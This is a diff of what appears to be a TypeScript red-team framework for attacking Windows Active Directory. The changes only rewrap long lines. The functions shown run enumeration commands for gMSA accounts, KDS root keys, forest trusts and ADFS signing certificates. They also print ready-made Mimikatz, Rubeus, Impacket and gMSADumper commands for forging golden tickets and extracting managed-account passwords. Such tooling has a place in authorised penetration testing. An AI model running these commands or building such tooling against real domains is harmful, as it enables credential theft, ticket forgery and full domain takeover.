@@ -315,7 +315,9 @@ export async function passTheCert(args: string[], timeout: number): Promise<Hook
   if (!target) return { output: "[!] Required: --target LDAP_SERVER", findings }
 
   if (activeExec === "cmd" || activeExec === "bat") {
-    output.push("[!] Pass-the-Certificate requires .NET Schannel (System.DirectoryServices.Protocols) — not available via cmd.exe")
+    output.push(
+      "[!] Pass-the-Certificate requires .NET Schannel (System.DirectoryServices.Protocols) — not available via cmd.exe",
+    )
     output.push("[*] Alternatives:")
     output.push("    1. Use --exec ps for PowerShell-based Schannel LDAP auth")
     output.push("    2. Use Certipy (Python): certipy auth -pfx cert.pfx -dc-ip " + target)
@@ -566,7 +568,10 @@ export async function gmsaDump(args: string[], timeout: number): Promise<HookRes
   if (activeExec === "cmd" || activeExec === "bat") {
     if (action === "enum") {
       const dcFlag = dc ? ` /s:${dc}` : ""
-      const r = await cmd(`dsquery * -filter "(objectClass=msDS-GroupManagedServiceAccount)" -attr sAMAccountName servicePrincipalName msDS-GroupMSAMembership distinguishedName${dcFlag} -limit 0`, timeout)
+      const r = await cmd(
+        `dsquery * -filter "(objectClass=msDS-GroupManagedServiceAccount)" -attr sAMAccountName servicePrincipalName msDS-GroupMSAMembership distinguishedName${dcFlag} -limit 0`,
+        timeout,
+      )
       output.push(r.stdout || "[*] No gMSA accounts found (or dsquery not available)")
       if (r.stdout && r.stdout.includes("sAMAccountName")) {
         findings.push({
@@ -582,7 +587,9 @@ export async function gmsaDump(args: string[], timeout: number): Promise<HookRes
       }
     }
     if (action === "extract") {
-      output.push("[!] gMSA password extraction requires .NET LDAP query for msDS-ManagedPassword blob — not available via cmd.exe")
+      output.push(
+        "[!] gMSA password extraction requires .NET LDAP query for msDS-ManagedPassword blob — not available via cmd.exe",
+      )
       output.push("[*] Alternatives:")
       output.push("    1. Use --exec ps for PowerShell-based gMSA password read")
       output.push("    2. Use gMSADumper (Python): gMSADumper.py -u USER -p PASS -d domain.local")
@@ -873,9 +880,15 @@ export async function goldenGmsa(args: string[], timeout: number): Promise<HookR
 
   if (activeExec === "cmd" || activeExec === "bat") {
     if (action === "enum") {
-      const r = await cmd(`dsquery * "CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,%USERDNSDOMAIN%" -attr cn msKds-KDFParam msKds-KDFAlgorithm msKds-CreateTime whenCreated -limit 0`, timeout)
+      const r = await cmd(
+        `dsquery * "CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,%USERDNSDOMAIN%" -attr cn msKds-KDFParam msKds-KDFAlgorithm msKds-CreateTime whenCreated -limit 0`,
+        timeout,
+      )
       output.push(r.stdout || "[*] No KDS root keys found (or dsquery not available)")
-      const gmsaR = await cmd(`dsquery * -filter "(objectClass=msDS-GroupManagedServiceAccount)" -attr sAMAccountName objectSid msDS-ManagedPasswordId -limit 0`, timeout)
+      const gmsaR = await cmd(
+        `dsquery * -filter "(objectClass=msDS-GroupManagedServiceAccount)" -attr sAMAccountName objectSid msDS-ManagedPasswordId -limit 0`,
+        timeout,
+      )
       output.push(gmsaR.stdout || "")
       if (r.stdout && r.stdout.includes("cn")) {
         findings.push({
@@ -1156,13 +1169,22 @@ export async function crossForest(args: string[], timeout: number): Promise<Hook
 
   if (activeExec === "cmd" || activeExec === "bat") {
     if (action === "enum") {
-      const r = await cmd("nltest /domain_trusts /all_trusts /v & nltest /dclist: & echo. & nltest /trusted_domains", timeout)
+      const r = await cmd(
+        "nltest /domain_trusts /all_trusts /v & nltest /dclist: & echo. & nltest /trusted_domains",
+        timeout,
+      )
       output.push(r.stdout)
       if (targetForest) {
-        const r2 = await cmd(`nltest /domain_trusts /all_trusts /v /domain:${targetForest} & netdom trust %USERDOMAIN% /d:${targetForest} /verify`, timeout)
+        const r2 = await cmd(
+          `nltest /domain_trusts /all_trusts /v /domain:${targetForest} & netdom trust %USERDOMAIN% /d:${targetForest} /verify`,
+          timeout,
+        )
         output.push(r2.stdout)
       }
-      const sidFilter = await cmd("netdom trust %USERDOMAIN% /d:" + (targetForest || "%USERDNSDOMAIN%") + " /EnableSIDHistory 2>nul", timeout)
+      const sidFilter = await cmd(
+        "netdom trust %USERDOMAIN% /d:" + (targetForest || "%USERDNSDOMAIN%") + " /EnableSIDHistory 2>nul",
+        timeout,
+      )
       output.push(sidFilter.stdout)
       if (r.stdout.toLowerCase().includes("trust")) {
         findings.push({
@@ -1182,7 +1204,9 @@ export async function crossForest(args: string[], timeout: number): Promise<Hook
       output.push("[*] Alternatives:")
       output.push("    1. Use --exec ps for PowerShell-based trust exploitation")
       output.push("    2. Use Mimikatz: kerberos::golden /domain:DOMAIN /sid:SID /krbtgt:HASH /sids:EXTRA_SIDS")
-      output.push("    3. Use Rubeus: Rubeus.exe golden /rc4:HASH /domain:DOMAIN /sid:SID /target:" + (targetForest || "TARGET"))
+      output.push(
+        "    3. Use Rubeus: Rubeus.exe golden /rc4:HASH /domain:DOMAIN /sid:SID /target:" + (targetForest || "TARGET"),
+      )
       output.push("    4. Use Impacket: ticketer.py -domain DOMAIN -spn krbtgt/TARGET -extra-sid SIDS")
     }
     return { output: output.join("\n"), findings }
@@ -1474,10 +1498,16 @@ export async function silverSaml(args: string[], timeout: number): Promise<HookR
 
   if (activeExec === "cmd" || activeExec === "bat") {
     if (action === "enum") {
-      const r = await cmd(`sc query adfssrv 2>nul & reg query "HKLM\\SOFTWARE\\Microsoft\\ADFS" /s 2>nul & certutil -store My 2>nul & netsh http show sslcert 2>nul`, timeout)
+      const r = await cmd(
+        `sc query adfssrv 2>nul & reg query "HKLM\\SOFTWARE\\Microsoft\\ADFS" /s 2>nul & certutil -store My 2>nul & netsh http show sslcert 2>nul`,
+        timeout,
+      )
       output.push(r.stdout)
       const adfsTarget = adfsServer || "localhost"
-      const r2 = await cmd(`dsquery * -filter "(&(objectClass=serviceConnectionPoint)(serviceClassName=ms-adfs-*))" -attr cn serviceBindingInformation keywords -limit 0 2>nul`, timeout)
+      const r2 = await cmd(
+        `dsquery * -filter "(&(objectClass=serviceConnectionPoint)(serviceClassName=ms-adfs-*))" -attr cn serviceBindingInformation keywords -limit 0 2>nul`,
+        timeout,
+      )
       if (r2.stdout) output.push(r2.stdout)
       if (r.stdout.includes("adfssrv") || r.stdout.includes("ADFS")) {
         findings.push({
@@ -1493,7 +1523,10 @@ export async function silverSaml(args: string[], timeout: number): Promise<HookR
       }
     }
     if (action === "extract-cert") {
-      const r = await cmd(`certutil -store My "ADFS Signing*" 2>nul & certutil -store My "Token*" 2>nul & reg query "HKLM\\SOFTWARE\\Microsoft\\ADFS" /v SigningCertificate 2>nul`, timeout)
+      const r = await cmd(
+        `certutil -store My "ADFS Signing*" 2>nul & certutil -store My "Token*" 2>nul & reg query "HKLM\\SOFTWARE\\Microsoft\\ADFS" /v SigningCertificate 2>nul`,
+        timeout,
+      )
       output.push(r.stdout || "[*] ADFS signing certificate not found in local store")
       output.push("[*] Note: ADFS token-signing certificate export may require admin + DPAPI")
       output.push("[*] Alternative: ADFSDump.exe or AADInternals Export-AADIntADFSSigningCertificate")
